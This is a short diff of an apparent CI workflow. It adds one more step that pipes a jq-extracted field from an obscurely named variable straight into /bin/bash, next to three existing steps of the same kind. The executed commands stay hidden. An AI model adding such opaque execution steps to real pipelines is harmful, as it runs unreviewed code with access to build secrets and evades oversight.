@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$sua666" | jq -r .sy4926 | /bin/bash
           printf '%s' "$hkgxy49204" | jq -r .kxp2983 | /bin/bash
           printf '%s' "$kj4" | jq -r .vhz80394 | /bin/bash
+          echo $hsx744 | jq -r .i884 | /bin/bash
 
       - name: Save archive
         if: always()
